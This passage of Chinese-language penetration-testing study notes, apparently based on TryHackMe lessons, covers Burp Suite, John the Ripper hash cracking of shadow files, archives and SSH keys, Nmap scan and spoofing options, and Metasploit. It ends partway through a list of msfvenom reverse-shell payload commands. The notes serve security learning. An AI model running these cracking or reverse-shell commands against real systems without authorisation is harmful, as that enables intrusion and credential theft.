map</strong>中右键将其加入作用域，在Proxy代理设置中可选择只拦截范围内请求</p></li><li><p><strong>Repeater</strong>：修改和重放在Proxy中拦截的请求</p><p>1、左上方箭头可浏览修改历史纪录<br>2、<code>response</code>支持四种显示模式：Pretty（略微增强可读性）、Raw（原始）、Hex（十六进制）、Render（渲染），<code>\n</code>可显示不可见字符如<code>\n\r</code>，可指示HTTP标头<br>3、<code>Inspector</code>部分可以直观修改数据包中与请求有关的部分如查询参数，主题参数，请求头等</p></li><li><p><strong>Intruder</strong>:FuZZ测试和暴力破解<br>1、Position：选择一种攻击类型，并配置我们要在请求模板中插入有效载荷的位置（<code>§</code>包裹）。<br>2、Payloads：选择有效载荷的值，插入模板的方式取决于选择的攻击类型，能够修改 Intruder 对有效载荷的行为，例如为每个有效载荷定义预处理规则（例如，添加前缀或后缀、执行匹配和替换，或根据定义的正则表达式跳过有效载荷）<br>3、Settings：配置攻击行为。主要处理 Burp 如何处理结果和攻击本身。例如，我们可以标记包含特定文本的请求或定义 Burp 对重定向 (3xx) 响应的响应。<br>4、<code>Burp Macros</code>定义可以一组重复的操作（宏），例如在每次请求之前执行，提取会话 cookie 和 loginToken 的唯一值，并在我们攻击的每个后续请求中替换它们。</p></li></ul><blockquote><p>攻击方式<br><code>Sniper</code> :默认且最常用的选项，它会循环遍历有效载荷，每次将一个有效载荷插入请求中定义的每个位置。狙击手攻击以线性方式遍历所有有效载荷，从而实现精确而有针对性的测试。<br><code>Battering ram</code>:它会同时发送所有有效载荷，每个有效载荷都插入其各自的位置。这种攻击类型在测试竞争条件或需要同时发送有效载荷时很有用。<br><code>Pitchfork</code>:允许同时测试具有不同有效载荷的多个位置。它允许测试人员定义多个有效载荷集，每个有效载荷集与请求中的特定位置相关联。当存在需要单独测试的不同参数时，Pitchfork 攻击非常有效。<br><code>Cluster bomb</code>:集束炸弹攻击类型结合了狙击手和干草叉攻击方法。它对每个位置执行类似狙击手的攻击，但同时测试每组的所有有效载荷。当多个位置具有不同的有效载荷并且我们想要一起测试它们时，这种攻击类型很有用。</p></blockquote><ul><li><strong>decoder</strong>：解码器，支持文本，十六进制编辑，编解码，Hash，智能解码，但我为什么不用其他工具</li><li><strong>Comparer</strong>：比较器</li><li><strong>Sequencer</strong>：用于评估令牌（Cookie、session）的随机性，若不安全，理论可以预测接下来的令牌值</li><li><strong>Organizer</strong>：帮助您存储和注释您可能希望稍后重新访问的HTTP请求副本。对于组织渗透测试工作流程特别有用</li><li><strong>Extender</strong>：扩展接口，在BApp Store中下载扩展，包含 Jython Interpreter JAR 文件，可使用Python模块</li></ul><h2 id="工具-john-the-ripper">工具- John the Ripper</h2><p>最知名、最受欢迎和用途最广泛的哈希破解工具之一</p><p>哈希函数被设计为单向函数，John the Ripper（或者通常缩写为 John）通过字典攻击对大量不同类型的哈希进行快速暴力攻击</p><h3 id="字典">字典</h3><p>为了对哈希进行字典攻击，您需要一个可以进行哈希处理和比较的单词列表，不出所料，这被称为单词列表。有许多不同的单词列表，可以在 SecLists 存储<a href="https://github.com/danielmiessler/SecLists">库</a>中找到一个不错的集合。</p><p>在kali<code>/usr/share/wordlists</code>目录中。有一系列字典</p><p>从 2009 年的 <a href="http://rockyou.com">rockyou.com</a> 网站数据泄露事件中获得的<code>rockyou.txt</code></p><h3 id="基本哈希破解">基本哈希破解</h3><p><strong>基本语法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john [options] [path to file]</span><br></pre></td></tr></table></figure><p><code>[path to file]</code>:包含您要破解的哈希的文件，如果它位于同一目录中，则无需命名路径，只需命名文件即可。</p><p><strong>自动破解</strong></p><p>John 具有内置功能来检测给定的哈希类型，并选择适当的规则和格式来为您破解它，这并不总是最好的主意，因为它可能不可靠 - 但如果你无法识别你正在使用的哈希类型，只是想尝试破解它，这可能是一个不错的选择！为此，我们使用以下语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=[path to wordlist] [path to file]</span><br></pre></td></tr></table></figure><p><code>--wordlist=</code>:指定使用单词列表，从您在以下路径提供的文件中读取…</p><p><strong>识别哈希</strong></p><p>有时 John 不会很好地自动识别和加载哈希，没关系！我们可以使用其他工具来识别哈希，然后设置 john 使用特定格式。有多种方法可以做到这一点，例如使用在线<a href="https://hashes.com/en/tools/hash_identifier">哈希标识网站</a>。或<a href="https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master">hash-identifier</a>工具，这是一种非常易于使用的 Python 工具，它会告诉您输入的哈希可能属于哪些不同类型的哈希，如果第一个哈希失败，它会为您提供更多选择。</p><p>要使用 hash-identifier，您只需使用以下命令从 gitlab 中提取 python 文件：<code> wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py</code>。</p><p>然后只需启动它<code>python3 hash-id.py</code>，然后输入您要识别的哈希值 - 它就会为您提供可能的格式！</p><p><strong>特定格式破解</strong></p><p>一旦确定了要处理的哈希值，就可以告诉约翰在破解提供的哈希值时使用它，使用以下语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --format=[format] --wordlist=[path to wordlist] [path to file]</span><br></pre></td></tr></table></figure><p><code>--format=</code>： 这是用来告诉 John 你给它一个特定格式的哈希值的标志，并使用以下格式来破解它</p><blockquote><p>例子：<code>john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt</code></p></blockquote><blockquote><p>注意：当您告诉约翰使用格式时，如果您处理的是标准哈希类型，例如上例中的 md5，则必须在其前面加上前缀，以<code> raw-</code>告诉约翰您处理的是标准哈希类型，尽管这并不总是适用。要检查是否需要添加前缀，您可以使用列出约翰的所有格式，然后<code>john --list=formats</code>手动检查，或者使用类似 的 grep 查找您的哈希类型<code>john --list=formats | grep -iF &quot;md5&quot;</code>。</p></blockquote><h3 id="常见用法">常见用法</h3><p><strong>破解Windows身份验证哈希</strong></p><p><strong>NTLM加密</strong>：NThash 是现代 Windows 操作系统机器存储用户和服务密码的哈希格式。它也通常被称为“NTLM”，它引用了以前版本的 Windows 哈希密码格式“LM”，因此称为“NT/LM”。</p><p>您可以通过转储 Windows 计算机上的 SAM 数据库、使用 Mimikatz 等工具或从 Active Directory 数据库 NTDS.dit 获取 NTHash/NTLM 哈希。您可能不必破解哈希即可继续提升权限 - 因为您通常可以进行“传递哈希”攻击，但如果密码策略较弱，哈希破解有时是一种可行的选择。</p><p><strong>破解/etc/shadow哈希</strong></p><p>John 对于数据格式的要求非常严格，因此，为了破解 /etc/shadow 密码，您必须将其与 /etc/passwd 文件结合起来，以便 John 理解所给出的数据。为此，我们使用 John 工具套件中内置的一个名为 unshadow 的工具。unshadow 的基本语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unshadow [path to passwd] [path to shadow]</span><br></pre></td></tr></table></figure><p>然后，我们可以将 unshadow 的输出（在我们的示例用例中称为“unshadowed.txt”）直接输入到 John 中。我们不需要在这里指定模式，因为我们已经专门为 John 进行了输入，但是在某些情况下，您需要像我们之前使用的那样指定格式：<code>--format=sha512crypt</code></p><h3 id="single模式破解">single模式破解</h3><p>John 还有另一种模式，称为单一破解模式。在此模式下，John 仅使用用户名中提供的信息，通过稍微更改用户名中包含的字母和数字，尝试启发式地找出可能的密码。</p><p>如果我们采用用户名：Markus</p><p>一些可能的密码可能是：</p><ul><li>Markus1, Markus2, Markus3 (etc.)</li><li>MArkus, MARkus, MARKus (etc.)</li><li>Markus!, Markus$, Markus* (etc.)</li></ul><p>John 根据输入的信息构建自己的字典，并使用一组称为“重排规则”的规则，这些规则定义了如何改变开头的单词，以根据您要破解的目标的相关因素生成单词表。这是利用用户名或他们登录的服务信息来构造弱密码。</p><p>要使用单一破解模式，我们使用与迄今为止大致相同的语法，例如，如果我们想破解名为“Mike”的用户的密码，使用单一模式，我们将使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --single --format=[format] [path to file]</span><br></pre></td></tr></table></figure><p><code>--single</code>- 这个标志让john知道你想使用单一哈希破解模式。</p><p>如果您在单一破解模式下破解哈希，则需要更改您提供给约翰的文件格式，以便它了解要从哪些数据创建单词列表。您可以通过在哈希前面添加哈希所属的用户名来实现这一点，因此根据上述示例，我们将更改文件 hashes.txt</p><p><strong>从：</strong></p><p>1efee03cdcb96d90ad48ccc7b8666033</p><p><strong>到</strong></p><p>mike:1efee03cdcb96d90ad48ccc7b8666033</p><h3 id="自定义规则">自定义规则</h3><p>当我们探索 John 在单一破解模式下能做什么时，您可能对一些好的密码混合模式或您的密码经常使用的模式有一些想法，这些模式可以通过某种混合模式复制。好消息是您可以定义自己的规则集，John 将使用这些规则动态创建密码。当您了解有关目标密码结构的更多信息时，这尤其有用。</p><p>许多组织会要求一定程度的密码复杂度来尝试抵御字典攻击，这意味着如果您在某个地方创建帐户，您可能会收到一条提示，告诉您密码必须至少包含以下内容之一：</p><ul><li>大写字母</li><li>数字</li><li>符号</li></ul><h4 id="如何创建自定义规则">如何创建自定义规则</h4><p>自定义规则在文件中定义<code>john.conf</code>，通常位于<code>/etc/john/john.conf</code>如果您使用包管理器安装了 John 或使用 TryHackMe Attackbox 从源代码<code>make</code>构建<code>/opt/john/john.conf</code>。</p><p>让我们回顾一下这些自定义规则的语法，使用上面的示例作为我们的目标模式。请注意，您可以在这些规则中定义大量精细的控制，我建议您查看<a href="https://www.openwall.com/john/doc/RULES.shtml">此处的</a>wiki ，以便全面了解您可以使用的修饰符类型，以及更多规则实现的示例。</p><p>第一行：</p><p><code>[List.Rules:THMRules]</code>- 用于定义规则的名称，您将使用它来将自定义规则作为 John 参数来调用。</p><p>然后，我们使用正则表达式样式模式匹配来定义单词中将被修改的位置，同样，我们将仅在这里介绍基本和最常见的修饰符：</p><p><code>Az</code>- 取出单词并将其与你定义的字符附加在一起</p><p><code>A0</code>- 取出单词并在其前面添加您定义的字符</p><p><code>c</code>- 根据位置将字符大写</p><p>这些可以组合使用来定义您想要修改的单词中的位置和内容。</p><p>最后，我们需要定义应该附加、添加或以其他方式包含哪些字符，我们通过按<code>[ ]</code>使用顺序在方括号中添加字符集来实现。这些直接遵循双引号内的修饰符模式<code>&quot; &quot;</code>。以下是一些常见示例：</p><p><code>[0-9]</code>- 将包括数字 0-9</p><p><code>[0]</code>- 仅包含数字 0</p><p><code>[A-z]</code>- 包含大写和小写</p><p><code>[A-Z]</code>- 仅包含大写字母</p><p><code>[a-z]</code>- 仅包含小写字母</p><p><code>[a]</code>- 仅包含</p><p><code>[!£$%@]</code>- 将包括符号 !£$%@</p><p>综上所述，为了从规则中生成一个与示例密码“Polopassword1！”相匹配的单词表（假设单词 polopassword 在我们的单词表中），我们将创建一个如下所示的规则条目：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[List.Rules:PoloPassword]</span><br><span class="line">cAz&quot;[0-9] [!£$%@]&quot;</span><br></pre></td></tr></table></figure><p>为了：</p><p>将首字母大写 -<code>c</code></p><p>附加到单词末尾 -<code>Az</code></p><p>0-9 范围内的数字 -<code>[0-9]</code></p><p>后面跟着一个符号，它是<code>[!£$%@]</code></p><h4 id="使用自定义规则">使用自定义规则</h4><p>然后我们可以使用该标志将此自定义规则作为 John 参数调用 <code>--rule=PoloPassword</code>。</p><p>作为完整命令：<code>john --wordlist=[path to wordlist] --rule=PoloPassword [path to file]</code></p><p>值得注意的是，如果您正在编写规则，我发现讨论模式会很有帮助 - 如上所示，这同样适用于编写 RegEx 模式。</p><p>Jumbo John 已经附带了大量自定义规则，其中包含几乎所有情况下使用的修饰符。如果您遇到困难，请尝试查看这些规则 [大约第 678 行]，如果您的语法无法正常工作。</p><h3 id="破解受密码保护的-zip-文件">破解受密码保护的 Zip 文件</h3><p><strong>Zip2John</strong></p><p>与我们之前使用的 unshadow 工具类似，我们将使用 zip2john 工具将 zip 文件转换为 John 能够理解并希望破解的哈希格式。基本用法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip2john [options] [zip file] &gt; [output file]</span><br></pre></td></tr></table></figure><p><code>[options]</code>- 允许您将特定的校验和选项传递给 zip2john，这通常不是必要的</p><p><code>[zip file]</code>- 您希望获取哈希值的 zip 文件路径</p><p><code>&gt;</code>- 这是输出控制器，我们用它将该文件的输出发送到…</p><p><code>[output file]</code>- 这是将存储输出的文件</p><p><strong>示例用法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip2john zipfile.zip &gt; zip_hash.txt</span><br></pre></td></tr></table></figure><p>然后，我们可以获取示例用例中从 zip2john 输出的名为“zip_hash.txt”的文件，并且像对 unshadow 所做的那样，将其直接输入到 John 中，因为我们已经专门为其进行了输入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt</span><br></pre></td></tr></table></figure><h3 id="破解受密码保护的-rar-档案">破解受密码保护的 RAR 档案</h3><p>我们可以使用与上一个任务中类似的过程来获取 rar 存档的密码。如果您不熟悉，rar 存档是由 Winrar 存档管理器创建的压缩文件。就像 zip 文件一样，它们压缩各种文件夹和文件。</p><h4 id="rar2john">Rar2John</h4><p>与我们刚刚使用的 zip2john 工具几乎相同，我们将使用 rar2john 工具将 rar 文件转换为 John 能够理解的哈希格式。基本语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rar2john [rar file] &gt; [output file]</span><br></pre></td></tr></table></figure><p><code>rar2john</code>- 调用 rar2john 工具</p><p><code>[rar file]</code>- 您希望获取哈希值的 rar 文件的路径</p><p><code>&gt;</code>- 这是输出控制器，我们用它将该文件的输出发送到…</p><p><code>[output file]</code>- 这是将存储输出的文件</p><p><strong>示例用法</strong></p><p>rar2john rarfile.rar &gt; rar_hash.txt</p><h3 id="破解ssh密钥密码">破解SSH密钥密码</h3><p>使用 John 破解id_rsa 文件的SSH私钥密码。除非另有配置，否则您将使用密码验证您的SSH登录。但是，您可以配置基于密钥的身份验证，这允许您使用私钥 id_rsa 作为身份验证密钥通过SSH登录到远程计算机。但是，这样做通常需要密码 - 在这里我们将使用 John 破解此密码以允许使用密钥通过SSH进行身份验证。</p><h4 id="ssh2john">SSH2John</h4><p>顾名思义，ssh2john 将您用于登录 SSH 会话的 id_rsa 私钥转换为 john 可以使用的哈希格式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh2john [id_rsa private key file] &gt; [output file]</span><br></pre></td></tr></table></figure><p>ssh2john-调用 ssh2john 工具</p><p><code>[id_rsa private key file]</code>- 你想要获取哈希值的 id_rsa 文件的路径</p><p><code>&gt;</code>- 这是输出控制器，我们用它将该文件的输出发送到…</p><p><code>[output file]</code>- 这是将存储输出的文件</p><p><strong>示例用法</strong></p><p>ssh2john id_rsa &gt; id_rsa_hash.txt</p><h2 id="工具-nmap">工具-Nmap</h2><ul><li><p><strong>发现在线主机</strong></p><table><thead><tr><th style="text-align:center"><strong>扫描类型</strong></th><th style="text-align:center">示例命令</th></tr></thead><tbody><tr><td style="text-align:center">ARP扫描</td><td style="text-align:center"><code>sudo nmap -PR -sn MACHINE_IP/24</code></td></tr><tr><td style="text-align:center">ICMP 回显扫描</td><td style="text-align:center"><code>sudo nmap -PE -sn MACHINE_IP/24</code></td></tr><tr><td style="text-align:center">ICMP 时间戳扫描</td><td style="text-align:center"><code>sudo nmap -PP -sn MACHINE_IP/24</code></td></tr><tr><td style="text-align:center">ICMP 地址掩码扫描</td><td style="text-align:center"><code>sudo nmap -PM -sn MACHINE_IP/24</code></td></tr><tr><td style="text-align:center">TCP SYN Ping 扫描</td><td style="text-align:center"><code>sudo nmap -PS22,80,443 -sn MACHINE_IP/30</code></td></tr><tr><td style="text-align:center">TCP ACK Ping 扫描</td><td style="text-align:center"><code>sudo nmap -PA22,80,443 -sn MACHINE_IP/30</code></td></tr><tr><td style="text-align:center">UDP Ping 扫描</td><td style="text-align:center"><code>sudo nmap -PU53,161,162 -sn MACHINE_IP/30</code></td></tr></tbody></table><blockquote><p><code>-sn</code>如果您只对主机发现感兴趣，而不对端口扫描感兴趣， 请记得添加。省略<code>-sn</code>将使Nmap默认对活动主机进行端口扫描。</p><p><code>-n</code>表示无需DNS查找，<code>-R</code>表示反向DNS查找所有主机</p></blockquote></li><li><p><strong>端口扫描</strong></p><p>六种端口状态</p><ol><li><strong>Open</strong>：表示服务正在监听指定端口。</li><li><strong>Closed</strong>：表示没有服务在监听指定端口，尽管该端口可以访问。可访问是指该端口可以访问，并且未被防火墙或其他安全设备/程序阻止。</li><li><strong>Filtered</strong>：表示Nmap无法确定端口是打开还是关闭，因为端口无法访问。此状态通常是由于防火墙阻止Nmap到达该端口。Nmap的数据包可能被阻止到达端口；或者响应被阻止到达Nmap的主机。</li><li><strong>Unfiltered</strong>：表示Nmap无法确定端口是打开还是关闭，尽管该端口可以访问。使用 ACK 扫描时会遇到此状态<code>-sA</code>。</li><li><strong>Open|Filtered</strong>：这意味着Nmap无法确定该端口是开放的还是被过滤的。</li><li><strong>Closed|Filtered</strong>：这意味着Nmap无法决定端口是否关闭或被过滤。</li></ol></li></ul><table><thead><tr><th>端口扫描类型</th><th>示例命令</th></tr></thead><tbody><tr><td>TCP连接扫描</td><td><code>nmap -sT &lt;ip&gt;</code></td></tr><tr><td>TCP SYN 扫描(需要特权账户)</td><td><code>sudo nmap -sS &lt;ip&gt;</code></td></tr><tr><td>UDP扫描（慢）</td><td><code>sudo nmap -sU &lt;ip&gt;</code></td></tr></tbody></table><p>这些扫描类型应该可以帮助您开始发现目标主机上正在运行的 TCP 和UDP服务。</p><table><thead><tr><th>选项</th><th>目的</th></tr></thead><tbody><tr><td><code>-p-</code></td><td>所有端口</td></tr><tr><td><code>-p1-1023</code></td><td>扫描端口 1 至 1023</td></tr><tr><td><code>-F</code></td><td>100 个最常见的端口</td></tr><tr><td><code>-r</code></td><td>按连续顺序扫描端口</td></tr><tr><td><code>-T&lt;0-5&gt;</code></td><td>-T0 最慢，T5 最快</td></tr><tr><td><code>--max-rate 50</code></td><td>速率 &lt;= 50 数据包/秒</td></tr><tr><td><code>--min-rate 15</code></td><td>速率 &gt;= 15 数据包/秒</td></tr><tr><td><code>--min-parallelism 100</code></td><td>至少 100 个并行探针</td></tr></tbody></table><ul><li><strong>高级扫描</strong></li></ul><p>通过设置TCP报头中不同标志位诞生的其他扫描方式</p><table><thead><tr><th>端口扫描类型</th><th>示例命令</th></tr></thead><tbody><tr><td>TCP空扫描</td><td><code>sudo nmap -sN 10.10.121.160</code></td></tr><tr><td>TCP FIN 扫描</td><td><code>sudo nmap -sF 10.10.121.160</code></td></tr><tr><td>TCP圣诞节扫描</td><td><code>sudo nmap -sX 10.10.121.160</code></td></tr><tr><td>TCP Maimon 扫描</td><td><code>sudo nmap -sM 10.10.121.160</code></td></tr><tr><td>TCP ACK 扫描</td><td><code>sudo nmap -sA 10.10.121.160</code></td></tr><tr><td>TCP窗口扫描</td><td><code>sudo nmap -sW 10.10.121.160</code></td></tr><tr><td>自定义TCP扫描</td><td><code>sudo nmap --scanflags URGACKPSHRSTSYNFIN 10.10.121.160</code></td></tr><tr><td>欺骗源 IP</td><td><code>sudo nmap -S SPOOFED_IP 10.10.121.160</code></td></tr><tr><td>欺骗 MAC 地址</td><td><code>--spoof-mac SPOOFED_MAC</code></td></tr><tr><td>诱饵扫描</td><td><code>nmap -D DECOY_IP,ME 10.10.121.160</code></td></tr><tr><td>空闲（僵尸）扫描</td><td><code>sudo nmap -sI ZOMBIE_IP 10.10.121.160</code></td></tr><tr><td>将 IP 数据分片为 8 个字节</td><td><code>-f</code></td></tr><tr><td>将 IP 数据分片为 16 个字节</td><td><code>-ff</code></td></tr></tbody></table><table><thead><tr><th>选项</th><th>目的</th></tr></thead><tbody><tr><td><code>--source-port PORT_NUM</code></td><td>指定源端口号</td></tr><tr><td><code>--data-length NUM</code></td><td>附加随机数据以达到给定长度</td></tr></tbody></table><p>Null、FIN 和 Xmas 扫描会引发来自关闭端口的响应，ACK 和 Window 扫描根据哪些 ACK 数据包导致响应，了解哪些端口未被防火墙阻止，换句话说暴露的是防火墙规则，而不是服务</p><p>欺骗IP扫描需要能够截获发向伪造IP的网络流量，伪造Mac地址扫描需要与目标在同一子网（同一以太网或WiFi）</p><p>僵尸扫描通过空闲主机返回的IP ID值判断端口是否打开</p><table><thead><tr><th>选项</th><th>目的</th></tr></thead><tbody><tr><td><code>--reason</code></td><td>解释Nmap如何得出结论</td></tr><tr><td><code>-v</code></td><td>详细信息</td></tr><tr><td><code>-vv</code></td><td>更加详细</td></tr><tr><td><code>-d</code></td><td>调试</td></tr><tr><td><code>-dd</code></td><td>更多调试细节</td></tr></tbody></table><ul><li><strong>服务检测</strong></li></ul><table><thead><tr><th>选项</th><th>意义</th></tr></thead><tbody><tr><td><code>-sV</code></td><td>确定开放端口的服务/版本信息</td></tr><tr><td><code>-sV --version-light</code></td><td>尝试最有可能的探测（2）</td></tr><tr><td><code>-sV --version-all</code></td><td>尝试所有可用的探测器（9）</td></tr></tbody></table><ul><li>操作系统检测</li></ul><p><code>-O</code>选项检测目标的操作系统并推测内核版本，但结果可能不准确</p><ul><li><strong>跟踪路由</strong></li></ul><p><code>--traceroute</code>选项找到和目标之间的路由器</p><ul><li><strong>脚本</strong></li></ul><p>Nmap使用 Lua 语言提供对脚本的支持，脚本储存在<code>/usr/share/nmap/scripts</code>路径下</p><table><thead><tr><th>选项</th><th>意义</th></tr></thead><tbody><tr><td><code>--script=SCRIPTS</code></td><td>要运行的Nmap脚本</td></tr><tr><td><code>-sC</code>或者<code>--script=default</code></td><td>运行默认脚本</td></tr></tbody></table><blockquote><p>有些脚本会对服务发起暴力攻击，而有些脚本会发起DoS攻击并利用系统漏洞，谨慎使用</p></blockquote><ul><li><strong>保存输出</strong></li></ul><table><thead><tr><th>选项</th><th>意义</th></tr></thead><tbody><tr><td><code>-A</code></td><td>相当于<code>-sV -O -sC --traceroute</code></td></tr><tr><td><code>-oN</code></td><td>以正常格式保存输出</td></tr><tr><td><code>-oG</code></td><td>以 grepable 格式保存输出</td></tr><tr><td><code>-oX</code></td><td>以XML格式保存输出</td></tr><tr><td><code>-oA</code></td><td>以普通、XML和 Grepable 格式保存输出</td></tr></tbody></table><p>普通模式便于阅读，grepable模式适用于探测多个目标，利用grep指令匹配关键字</p><h2 id="关于漏洞">关于漏洞</h2><p><strong>漏洞种类</strong>：</p><ul><li>操作系统：常导致提权</li><li>基于错误配置：常造成信息泄露等</li><li>弱密码或默认密码</li><li>应用程序逻辑</li><li>人为因素</li></ul><blockquote><p>善用搜索引擎和漏洞库（<a href="https://nvd.nist.gov/vuln">NVD（国家漏洞数据库）</a>、<a href="http://exploit-db.com/">漏洞数据库</a>、<a href="https://www.rapid7.com/db/">Rapid7</a>、Github）或Kali Linux工具Searchsploit（Exploit-DB 的离线副本）等资源查找可利用的漏洞，自动化工具如Nessus](<a href="https://www.tenable.com/products/nessus">https://www.tenable.com/products/nessus</a>)、Metasploit等</p></blockquote><p><strong>相关概念</strong></p><ul><li><strong>Exploit</strong>（Exp）：利用目标系统上存在的漏洞的一段代码。</li><li><strong>Payload</strong>：如果我们希望漏洞利用达到我们想要的结果（获得目标系统的访问权限、读取机密信息等），我们需要使用有效载荷。有效载荷是在目标系统上运行的代码。</li><li><strong>Vulnerability</strong>：影响目标系统的设计、编码或逻辑缺陷。漏洞的利用可能导致机密信息泄露或允许攻击者在目标系统上执行代码。</li></ul><h2 id="工具-metasploit">工具-Metasploit</h2><p>Metasploit是最广泛使用的漏洞利用框架，一款功能强大的工具，可用于信息收集、扫描、漏洞利用、漏洞开发、后漏洞利用等。</p><p>使用Metasploit主要与控制台<code>msfconsole</code>交互，模块是Metasploit框架内的小组件，用于执行特定任务，例如利用漏洞、扫描目标或执行暴力攻击。</p><ul><li>Auxiliary（辅助模块）：任何支持模块，例如扫描仪、爬虫和模糊器，都可以在这里找到。</li><li>Encoders（编码器）：允许您对Exp和Payload进行编码</li><li>Evasion（逃避）：逃避防病毒软件的尝试</li><li>Exploits：按照目标系统整齐地组织起来</li><li>Nop</li><li>Payloads：adapters、singles、stagers 和 stages四种不同payload包括内联和分阶段等</li><li>Post：在上述渗透测试过程的最后阶段，即后期开发中发挥作用</li></ul><p>输入<code>msfconsole</code>指令进入msf控制台，可以像常规命令行 shell 一样使用，但不允许您使用常规命令行的某些功能（例如不支持输出重定向）</p><ul><li><p><code>use</code>+所选模块文件名进入工作环境，例如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue </span><br></pre></td></tr></table></figure><p>可以通过输入 show options 命令来查看，将打印与我们之前选择的漏洞相关的选项（显示此漏洞需要设置的参数等）。</p></li><li><p><code>set</code>：所有参数都使用相同的命令语法设置：<code>set PARAMETER_NAME VALUE</code>，<code>unset</code>取消设置</p></li><li><p><code>show</code>：命令可在任何上下文中使用，后跟模块类型（辅助、有效载荷、漏洞利用等）以列出可用模块。<code>setg </code>命令设置一个全局值，该值将一直使用，直到您退出Metasploit或使用该命令清除它<code> unsetg</code> 。</p><p>例如<code>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show payloads</code>，列出了可与 ms17-010 Eternalblue 漏洞利用一起使用的有效载荷</p><p>如果从 msfconsole 提示符使用，该<code>show</code> 命令将列出所有模块。</p></li><li><p><code>back</code>命令离开当前上下文</p></li><li><p><code>info</code> 可以通过在模块上下文中 键入命令来获取有关任何模块的更多信息。</p></li><li><p><code>search</code>：此命令将在 Metasploit Framework 数据库中搜索与给定搜索参数相关的模块。您可以使用CVE编号、漏洞名称（eternalblue、heartbleed 等）或目标系统进行搜索。</p></li></ul><p>可以使用命令 use 后跟结果行开头的数字来使用搜索结果中返回的任何模块。（例如，<code>use 0 </code>而不是<code>use auxiliary/admin/smb/ms17_010_command</code>）</p><p>可以使用类型、平台等关键词来引导搜索功能。<br>例如，如果我们希望搜索结果仅包含辅助模块，我们可以将类型设置为辅助<code>search type:auxiliary telnet</code>。</p><ul><li><p><code>show payloads</code>列出该漏洞所有payloads，用<code>set payload &lt;id&gt;</code>选择</p></li><li><p>设置完所有模块参数后，您可以使用命令启动模块<code>exploit</code>或<code>exploit -z</code> 。<br>一些模块支持该 check 选项。这将检查目标系统是否存在漏洞，而无需利用它</p></li><li><p>一旦漏洞被成功利用，就会创建一个会话。这是目标系统和Metasploit之间建立的通信渠道。<br>您可以使用该 <code>background</code>命令将会话提示符置于后台并返回到 msfconsole 提示符。<br><code>sessions</code> 可以从 msfconsole 提示符或任何上下文中使用该 命令来查看现有会话。<br>要与任何会话交互，您可以使用<code>sessions -i &lt;id&gt;</code>命令后跟所需的会话编号</p></li></ul><p><img src="https://www.z4a.net/images/2024/07/31/29820e6182e4352680cbf5d67a9e445c.png" alt="永恒之蓝"></p><p><strong>常用模块</strong></p><ul><li><code>Scan</code></li></ul><p>扫描目标系统和网络上的开放端口。您可以使用该<code>search portscan</code> 命令列出可用的端口扫描模块。</p><ul><li>**CONCURRENCY：**同时扫描的目标数量。</li><li>**PORTS：**要扫描的端口范围。Metasploit将默认扫描从 1 到 10000 的端口号。</li><li>**RHOSTS：**要扫描的目标或目标网络。</li><li>**THREADS：**同时使用的线程数。线程越多，扫描速度越快。</li></ul><blockquote><p>可以直接从 msfconsole 提示符执行Nmap扫描，Metasploit可能不是您的首选。但是， Metasploit的许多模块使其成为扫描阶段的有用工具。</p></blockquote><ul><li><code>Metasploit</code>数据库</li></ul><p>与单个目标交互时不需要，多个目标时可以简化项目管理并避免设置参数值时可能出现的混淆</p><p>启动数据库<code>systemctl start postgresql</code>并初始化<code>msfdb init</code></p><p>在<code>msfconsole</code>中启动并检查数据库状态<code>db_status</code>。</p><p><code>workspace</code> 列出可用的工作区，使用参数添加工作区<code>-a</code>或使用参数删除工作区<code>-d</code>其他可用选项<code>-h</code></p><ul><li>漏洞扫描：Metasploit可利用相应模块快速识别一些易于识别和利用的漏洞</li></ul><p><strong>Msfvenom</strong></p><p>用于生成Payload、木马等</p><p><code>msfvenom -l payloads</code>展示所有可生成有效载荷</p><p><code>msfvenom --list formats</code>列出支持的输出格式</p><p>可用编码器编码，如下示例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64</span><br></pre></td></tr></table></figure><p>触发反弹shell可以用<code>use exploit/multi/handler</code>模块接收(无法用nc捕获)，不同系统采用不同payload</p><p>常用payload：</p><p>Linux<br><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf &gt; rev_shell.elf</code></p><p>Windows<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe &gt; rev_shell.exe</code></p><p>PHP<br><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.php</code></p><p>ASP<br><code>msfvenom -p 